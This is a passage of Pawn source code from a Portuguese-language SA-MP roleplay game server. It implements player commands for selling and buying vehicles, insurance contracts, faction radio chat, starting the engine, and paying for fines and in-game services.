				SetVehiclePosEx(car, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ]);
				SetVehicleZAngle(car, oInfo[0][EntradaApreendidosA]);

	        }
	        else
	        {
				SetPlayerInterior(playerid, oInfo[0][EntradaApreendidosInterior]);
				SetPlayerVirtualWorld(playerid, oInfo[0][EntradaApreendidosVirtualWorld]);
				SetPlayerPosEx(playerid, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ]);
			}

            //IsInGaragemPSP[playerid] = false;

	        return 1;
	    }
	}
    
	return 1;
}

COMMAND:venderveiculo(playerid, params[], help)
{
	if(!IsPlayerInRangeOfPoint(playerid, 8.0, oInfo[0][VenderVeiculoX], oInfo[0][VenderVeiculoY], oInfo[0][VenderVeiculoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de vender veículo.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	
	new string[128];
	new car = GetPlayerVehicleID(playerid);
	
   	if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário desse veículo!");
	if(pInfo[playerid][ChaveCarro1] == car) pInfo[playerid][ChaveCarro1] = 0;
	if(pInfo[playerid][ChaveCarro2] == car) pInfo[playerid][ChaveCarro2] = 0;
	if(pInfo[playerid][ChaveCarro3] == car) pInfo[playerid][ChaveCarro3] = 0;
	if(pInfo[playerid][ChaveCarro4] == car) pInfo[playerid][ChaveCarro4] = 0;
	
	new valor, carprice = GetStandPrice(GetVehicleModel(car));
	
	if(pInfo[playerid][Golds] > 0)
	{
		valor = floatround(((floatround(carprice / 2, floatround_round)) / 100) * 75, floatround_round);
		
		format(string, sizeof(string), "Vendeste o teu veículo por %d$. (como és VIP recebeste 75 p/cento do valor original do carro)", valor);
		SendClientMessage(playerid, COLOR_INFO, string);
	}
	else
	{
		valor = floatround(carprice / 2, floatround_round);

		format(string, sizeof(string), "Vendeste o teu veículo por %d$.", valor);
		SendClientMessage(playerid, COLOR_INFO, string);
	}
	
	pInfo[playerid][Bank] += valor;
	
	RemoverJogadorDoCarro(playerid);
	
	new rX = random(50);
	new rY = random(50);
	new rZ = random(10);
	
	cInfo[car][Model] = 510;
	cInfo[car][Color1] = 0;
	cInfo[car][Color2] = 0;
	cInfo[car][Faction] = 0;
	cInfo[car][Type] = 0;
	cInfo[car][Comprado] = 0;
	cInfo[car][Travao] = 0;
	cInfo[car][Kilometros] = 0;
	cInfo[car][Metros] = 0;
	cInfo[car][Neon] = 0;
	cInfo[car][NeonStatus] = 0;
	cInfo[car][Gasolina] = 100;
	cInfo[car][Vida] = 0;
	cInfo[car][mod1] = 0;
	cInfo[car][mod2] = 0;
	cInfo[car][mod3] = 0;
	cInfo[car][mod4] = 0;
	cInfo[car][mod5] = 0;
	cInfo[car][mod6] = 0;
	cInfo[car][mod7] = 0;
	cInfo[car][mod8] = 0;
	cInfo[car][mod9] = 0;
	cInfo[car][mod10] = 0;
	cInfo[car][mod11] = 0;
	cInfo[car][Apreendido] = 0;
	cInfo[car][Arma1] = 0;
	cInfo[car][Ammo1] = 0;
	cInfo[car][Arma2] = 0;
	cInfo[car][Ammo2] = 0;
	cInfo[car][Arma3] = 0;
	cInfo[car][Ammo3] = 0;
	cInfo[car][RadioStatus] = 0;
	cInfo[car][IsCaravana] = 0;
	cInfo[car][CaravanaCasaID] = 0;
	cInfo[car][X] = 304.7568 + rX;
	cInfo[car][Y] = 1978.2449 + rY;
	cInfo[car][Z] = 16.6059 + rZ;
	
	IsARespawn[car] = true;
	DestroyVehicle(cInfo[car][ID]);
	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
	AtualizarDanosCarro(car);
   	
	return 1;
}

COMMAND:comprarveiculo(playerid, params[], help)
{
	//new bID = GetPlayerVirtualWorld(playerid);

	//if(bInfo[bID][Type] != BTYPE_STAND) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no stand.");
	
	if(IsPlayerInRangeOfPoint(playerid, 15.0, 2510.8594, -1753.8397, 13.5748))
	{
	    ShowModelSelectionMenu(playerid, ListaCarrosComprar, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
	}
	else
	{
	     SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no Stand");
	     return 1;
	}

	return 1;
}

COMMAND:catalogo(playerid, params[], help)
{
	//new bID = GetPlayerVirtualWorld(playerid);

	//if(bInfo[bID][Type] != BTYPE_STAND) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no stand.");

	if(IsPlayerInRangeOfPoint(playerid, 15.0, 2510.8594, -1753.8397, 13.5748))
	{
 		ShowModelSelectionMenu(playerid, ListaCarros, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);

		PlayerActionMessage(playerid, 15.0, "pega no catálogo e vé os veículos.");
	}
	else
	{
	     SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no Stand");
	     return 1;
	}

	return 1;
}

/*COMMAND:catalogo(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);

	if(bInfo[bID][Type] != BTYPE_ROUPA && bInfo[bID][Type] != BTYPE_STAND && bInfo[bID][Type] != BTYPE_247 && bInfo[bID][Type] != BTYPE_CACA ) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
	
	switch(bInfo[bID][Type])
	{
	    case BTYPE_STAND:
	    {
	        ShowModelSelectionMenu(playerid, ListaCarros, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
	        
	        PlayerActionMessage(playerid, 15.0, "pega no catálogo e vé os veículos.");
	    }
	    case BTYPE_ROUPA:
	    {
			ShowModelSelectionMenu(playerid, ListaSkins, "Roupas", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);

 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as roupas.");
	    }
	    case BTYPE_247:
	    {
			ShowModelSelectionMenu(playerid, ListaObjetos, "24/7", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);

 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os produtos.");
	    }
	    case BTYPE_CACA:
	    {
            Menu_Show(playerid, MenuArmas, 0x9FE5F5FF, false);
            TogglePlayerControllable(playerid, false);
            
 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as armas.");
	    }
	}

	return 1;
}*/

/*COMMAND:comprar(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);

	if(bInfo[bID][Type] != BTYPE_247 && bInfo[bID][Type] != BTYPE_CACA && bInfo[bID][Type] != BTYPE_FARMACIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja Não tem produtos");

	switch(bInfo[bID][Type])
	{
	    case BTYPE_247:
	    {
			ShowModelSelectionMenu(playerid, ListaObjetosComprar, "24/7", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);

 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os produtos.");
	    }
	    case BTYPE_CACA:
	    {
 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as armas.");
	    }
	    case BTYPE_FARMACIA:
	    {
			new string[128], sdialog[512];

			format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Cégripe"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Cran-Aid"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Tylenol"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Bisolvon"); strcat(sdialog,string);

			ShowPlayerDialog(playerid, DIALOG_FARMACIA, DIALOG_STYLE_LIST, "{FFFF00}MENU DA LOJA", sdialog, "Selecionar", "Sair");
	    }
	    case BTYPE_TELE:
	    {
	        if(GetPlayerMoneyEx(playerid) < PRECO_TELE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        if(pObjects[playerid][Telemovel] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um telemóvel");
	        
	        GivePlayerMoneyEx(playerid, -PRECO_TELE);
	        
            PlayerActionMessage(playerid, 15.0, "recebe uma caixa com um telemóvel lá dentro.");
	        
	        pObjects[playerid][Telemovel] = 1;
	        bInfo[bID][Produtos]--;
	        
	        SendClientMessage(playerid, COLOR_INFO, "Compraste um telemóvel");
	    }
	}

	return 1;
}*/

COMMAND:assinarcontrato(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);
	new string[128];

	if(bInfo[bID][Type] != BTYPE_SEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
    if(GetPlayerMoneyEx(playerid) < PRECO_CONTSEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
    if(pInfo[playerid][Seguradora] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma seguradora. Termina o contrato com ela primeiro.");
    
    pInfo[playerid][Seguradora] = bID;
    pInfo[playerid][MensalidadeSeguradora] = bInfo[bID][Seguradora];
    
    GivePlayerMoneyEx(playerid, -PRECO_CONTSEGURADORA);
    bInfo[bID][Bank] += PRECO_CONTSEGURADORA;
    
    PlayerActionMessage(playerid, 15.0, "pega na caneta e assina o contrato.");
    
    format(string, sizeof(string), "Assinaste contrato com a seguradora {00FF00}%s {52E3BA}com sucesso!", bInfo[bID][Nome]);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:acabarcontrato(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);
	new string[128];

	if(bInfo[bID][Type] != BTYPE_SEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
    if(pInfo[playerid][Seguradora] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma seguradora.");
    if(pInfo[playerid][Seguradora] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}O teu contrato não é com essa seguradora!");
	if(pInfo[playerid][SeguradoraCount] < 5) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de esperar 5 meses para acabares o teu contrato ((paychecks))!");

    pInfo[playerid][Seguradora] = 0;
    pInfo[playerid][MensalidadeSeguradora] = 0;

    PlayerActionMessage(playerid, 15.0, "rasga o contrato, anulando-o.");

    format(string, sizeof(string), "Acabaste o teu contrato com a seguradora {00FF00}%s {52E3BA}com sucesso!", bInfo[bID][Nome]);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:compraracessorio(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);

	if(bInfo[bID][Type] != BTYPE_ROUPA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");

	ShowModelSelectionMenu(playerid, ListaAcessorios, "Acessorios", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
	PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os acessórios.");

	return 1;
}

/*COMMAND:comer(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);
	new r = random(3);
	new action[32];
	
	if(bInfo[bID][Type] != BTYPE_RESTAURANTE) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Restaurante");
	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
	if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	
	SetPlayerHealthEx(playerid, 50, 1);
 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA);
	bInfo[bID][Bank] += PRECO_COMIDA;
	bInfo[bID][Produtos]--;
 	
 	switch(r)
 	{
		case 0: { action = "come uma pizza."; ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 4.1, 0, 1, 1, 0, 2, 1); }
		case 1: { action = "come uma sande."; ApplyAnimation(playerid, "FOOD", "EAT_Chicken",4.1, 0, 1, 1, 0, 2, 1); }
		case 2: { action = "come umas bifanas."; ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2, 1); }
	}
 	
 	PlayerActionMessage(playerid, 15.0, action);
 	
	return 1;
}*/

/*COMMAND:comprarbebida(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);

	if(bInfo[bID][Type] != BTYPE_BAR) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Bar");
	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
	if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

	DrunkLevel[playerid]++;

 	switch(DrunkLevel[playerid])
 	{
 	    case 1:
 	    {
 	        SetPlayerDrunkLevel(playerid, 1000);
 	    }
 	    case 2:
 	    {
            SetPlayerDrunkLevel(playerid, 2000);
 	    }
 	    case 3:
 	    {
 	        SetPlayerDrunkLevel(playerid, 3000);
 	    }
 	    case 4:
 	    {
 	        SetPlayerDrunkLevel(playerid, 5000);
 	    }
 	    default:
 	    {
 	        SetPlayerDrunkLevel(playerid, 50000);
 	    }
 	}
 	
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
 	
 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA);
	bInfo[bID][Bank] += PRECO_BEBIDA;
	bInfo[bID][Produtos]--;

 	PlayerActionMessage(playerid, 15.0, "pega na garrafa e bebe.");
 	
 	TimerDrunk[playerid] = SetTimerEx("MenosDrunk", 60000, true, "i", playerid);

	return 1;
}*/

COMMAND:r(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/r <mensagem>");

    if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");
	if(fInfo[pInfo[playerid][Faction]][Legal] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction Inválida");

	RadioMessage(playerid, pInfo[playerid][Faction], mensagem);

	return 1;
}

COMMAND:f(playerid, params[], help)
{
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/f <mensagem OOC>");

    if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");

	RadioMessageOOC(playerid, pInfo[playerid][Faction], mensagem);

	return 1;
}

COMMAND:rg(playerid, params[], help)
{ 
	new mensagem[128];

    if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/rg <mensagem>");
    
    if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");
	if(fInfo[pInfo[playerid][Faction]][Legal] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction Inválida");
	
	RadioMessageGlobal(playerid, pInfo[playerid][Faction], mensagem);
	
	return 1;
}

COMMAND:b(playerid, params[], help)
{
	new action[64];

    if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/b <chat>");

	new string[128];

	format(string, sizeof(string), "%s", action);
 	ProxDetector(7.0, playerid, string);

	return 1;
}

COMMAND:me(playerid, params[], help)
{
	new action[64];
	
    if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/me <ação>");
    
	new string[128];
	
	format(string, sizeof(string), "%s.", action);
	PlayerActionMessage(playerid, 15.0, string);
	
	return 1;
}

COMMAND:do(playerid, params[], help)
{
	new action[64];

    if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/do <informação>");
	
	ProxDetectorDo(20.0, playerid, action);
	
	return 1;
}

COMMAND:tentar(playerid, params[], help)
{
	new action[64];

    if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tentar <ação>");

	new succeed = 1 + random(2);
	new string[128];
	if(succeed == 1)
	{
		format(string, sizeof(string), "tenta %s e {00FF00}consegue{D65FE3}*.", action);
		
		ProxDetectorRP(10.0, playerid, string);
		SetPlayerChatBubble(playerid, string, COLOR_ACTION, 15.0, 3000);
	}
	else if(succeed == 2)
	{
		format(string, sizeof(string), "tenta %s mas {FF0000}falha{D65FE3}*.", action);
		ProxDetectorRP(10.0, playerid, string);
	}

	return 1;
}

COMMAND:motor(playerid, params[], help)
{
	new car = GetPlayerVehicleID(playerid);
 	new Float:health;
    GetVehicleHealth(car, health);
    
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
    if(AdminDuty[playerid] == false)
    {
        if(Motor[car] == false)
		{
		    if(cInfo[car][Travao] == 1)
		    {
				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo está travado!");

				return 1;
		    }
			if(cInfo[car][Type] == -1)
			{
				if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car && pInfo[playerid][ChaveCarroEmp1] != car && pInfo[playerid][ChaveCarroEmp2] != car && pInfo[playerid][ChaveCarroEmp3] != car && pInfo[playerid][ChaveCarroEmp4] != car)
				{
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens a chave desse veículo!");

					return 1;
				}
			}
			if(cInfo[car][Type] == -2)
			{
				if(pInfo[playerid][Faction] != cInfo[car][Faction])
				{
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens a chave desse veículo!");

					return 1;
				}
			}
			if(cInfo[car][Kilometros] > 2500)
			{
				PlayerActionMessage(playerid, 15.0, "repara na luz da revisão acesa.");
			    SendClientMessage(playerid, COLOR_INFO, "O teu carro tem mais de 10000 KM, vai fazer a revisão!");
			}
			if(cInfo[car][Kilometros] > 3800)
			{
			    new rand = random(10);

				if(rand == 1)
				{
				    SendClientMessage(playerid, COLOR_INFO, "O teu carro avariou por não teres feito a revisão!");
				    SetVehicleHealth(car, 300.0);
				    cInfo[car][Vida] = 300.0;

				    return 1;
				}
			}
			if(health <= 300)
			{
			    new rand = random(10);

			    if(rand != 1)
			    {
			        PlayerActionMessage(playerid, 15.0, "tenta ligar o carro e falha.");
			        return 1;
			    }
			    else
			    {
			        PlayerActionMessage(playerid, 15.0, "tenta ligar o e consegue.");
			    }
			}
		}
		else
		{
		    new engine, lights, alarm, doors, bonnet, boot, objective;

			GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
			Motor[car] = false;
			PlayerActionMessage(playerid, 15.0, "gira a chave na ignição e desliga o carro.");
			
			return 1;
		}
	}
	
	if(cInfo[car][Gasolina] == 0)
	{
 		PlayerActionMessage(playerid, 15.0, "repara que o carro não tem gasolina.");

		return 1;
	}

    Motor[car] = true;
	PlayerActionMessage(playerid, 15.0, "gira a chave na ignição.");
	SetTimerEx("LigarMotor", 1500, false, "i", playerid);

	return 1;
}

COMMAND:pagarmulta(playerid, params[], help)
{
	if(Multado[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não foste multado");
	if(!ProxDetectorS(8.0, playerid, MultadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do polícia");

	new string[128];

	if(GetPlayerMoneyEx(playerid) >= CustoMulta[playerid])
	{
		format(string, sizeof(string), "Pagaste a tua multa de %d$", CustoMulta[playerid]);
		GivePlayerMoneyEx(playerid, -CustoMulta[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a tua multa de %d$ (dinheiro do banco)", CustoMulta[playerid]);
		pInfo[playerid][Bank] -= CustoMulta[playerid];
	}

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a sua multa de %d$", GetPlayerNameEx(playerid), CustoMulta[playerid]);
	SendClientMessage(MultadorID[playerid], COLOR_INFO, string);
	
	fInfo[pInfo[MultadorID[playerid]][Faction]][Bank] += CustoMulta[playerid];

	Multado[playerid] = false;
	CustoMulta[playerid] = 0;
	MultadorID[playerid] = 0;

	return 1;
}

COMMAND:aceitarentrevista(playerid, params[], help)
{
	if(Entrevista[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma oferta de entrevista pendente");
	if(!ProxDetectorS(8.0, playerid, EntrevistadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do entrevistador");

	SendClientMessage(playerid, COLOR_CHAT, "Aceitaste o pedido de entrevista!");
	SendClientMessage(EntrevistadorID[playerid], COLOR_CHAT, "Aceitaram o teu pedido de entrevista! (/pararentrevista)");
	
	Entrevista[playerid] = false;
	EntrevistadorID[playerid] = INVALID_PLAYER_ID;
	ASerEntrevistado[playerid] = true;
	AEntrevistar[EntrevistadorID[playerid]] = true;
	
	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Entrevista ]_____________________________________");
	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");

	return 1;
}

COMMAND:aceitaratesto(playerid, params[], help)
{
	if(Atestar[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma oferta de reparação pendente");
	if(!ProxDetectorS(8.0, playerid, AtestadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do mecânico");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new string[128];

	new car = GetPlayerVehicleID(playerid);

	if(GetPlayerMoneyEx(playerid) >= PrecoAtestar[playerid])
	{
		format(string, sizeof(string), "Pagaste o atesto de %d$", PrecoAtestar[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoAtestar[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste o atesto de %d$ (dinheiro do banco)", PrecoAtestar[playerid]);
		pInfo[playerid][Bank] -= PrecoAtestar[playerid];
	}

	cInfo[car][Gasolina] = 100;

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou o seu atesto de %d$", GetPlayerNameEx(playerid), PrecoAtestar[playerid]);
	SendClientMessage(ReparadorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[AtestadorID[playerid]][Faction]][Bank] += PrecoAtestar[playerid];

	Atestar[playerid] = false;
	PrecoAtestar[playerid] = 0;
	AtestadorID[playerid] = 0;

	return 1;
}

COMMAND:aceitardesentoxicacao(playerid, params[], help)
{
	if(Desentoxicar[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma desentoxicação pendente");
	if(!ProxDetectorS(8.0, playerid, DesentoxicadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do médico");

	new string[128];

	if(GetPlayerMoneyEx(playerid) >= PrecoDesentoxicar[playerid])
	{
		format(string, sizeof(string), "Pagaste a desentoxicação de %d$", PrecoDesentoxicar[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoDesentoxicar[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a desentoxicação de %d$ (dinheiro do banco)", PrecoDesentoxicar[playerid]);
		pInfo[playerid][Bank] -= PrecoDesentoxicar[playerid];
	}

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a desentoxicação de %d$", GetPlayerNameEx(playerid), PrecoDesentoxicar[playerid]);
	SendClientMessage(DesentoxicadorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[DesentoxicadorID[playerid]][Faction]][Bank] += PrecoDesentoxicar[playerid];

	Desentoxicar[playerid] = false;
	PrecoDesentoxicar[playerid] = 0;
	DesentoxicadorID[playerid] = 0;
	
	pInfo[playerid][ADesentoxicar] = 1;

	return 1;
}

COMMAND:aceitarconsulta(playerid, params[], help)
{
	if(Consulta[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma receita médica pendente");
	if(!ProxDetectorS(8.0, playerid, ConsultadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do médico");

	new string[128];

	if(GetPlayerMoneyEx(playerid) >= PrecoConsulta[playerid])
	{
		format(string, sizeof(string), "Pagaste a consulta médica de %d$", PrecoConsulta[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoConsulta[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a consulta médica de %d$ (dinheiro do banco)", PrecoConsulta[playerid]);
		pInfo[playerid][Bank] -= PrecoConsulta[playerid];
	}

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a consulta médica de %d$", GetPlayerNameEx(playerid), PrecoConsulta[playerid]);
	SendClientMessage(ConsultadorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[ConsultadorID[playerid]][Faction]][Bank] += PrecoConsulta[playerid];

	Consulta[playerid] = false;
	PrecoConsulta[playerid] = 0;
	ConsultadorID[playerid] = 0;

	return 1;
}

COMMAND:aceitarreceita(playerid, params[], help)
{
	if(Receita[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens receita médica pendente");
	if(!ProxDetectorS(8.0, playerid, ReceitadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do médico");

	new string[128];

	if(GetPlayerMoneyEx(playerid) >= PrecoReceita[playerid])
	{
		format(string, sizeof(string), "Pagaste a receita médica de %d$", PrecoReceita[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoReceita[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a receita médica de %d$ (dinheiro do banco)", PrecoReceita[playerid]);
		pInfo[playerid][Bank] -= PrecoReceita[playerid];
	}

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a receita médica de %d$", GetPlayerNameEx(playerid), PrecoReceita[playerid]);
	SendClientMessage(ReceitadorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[ReceitadorID[playerid]][Faction]][Bank] += PrecoReceita[playerid];
	pInfo[playerid][ReceitaMedica] = Medicamento[playerid];

	Receita[playerid] = false;
	PrecoReceita[playerid] = 0;
	ReceitadorID[playerid] = 0;

	return 1;
}

COMMAND:aceitarrevisao(playerid, params[], help)
{
	if(Revisao[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma oferta de revisão pendente");
	if(!ProxDetectorS(8.0, playerid, RevisorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do mecânico");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new string[128];

	new car = GetPlayerVehicleID(playerid);

	if(GetPlayerMoneyEx(playerid) >= PrecoRevisao[playerid])
	{
		format(string, sizeof(string), "Pagaste a revisão de %d$", PrecoRevisao[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoRevisao[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a revisão de %d$ (dinheiro do banco)", PrecoRevisao[playerid]);
		pInfo[playerid][Bank] -= PrecoRevisao[playerid];
	}

	cInfo[car][Kilometros] = 0;

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a sua revisão de %d$", GetPlayerNameEx(playerid), PrecoRevisao[playerid]);
	SendClientMessage(RevisorID[playerid], COLOR_INFO, string);

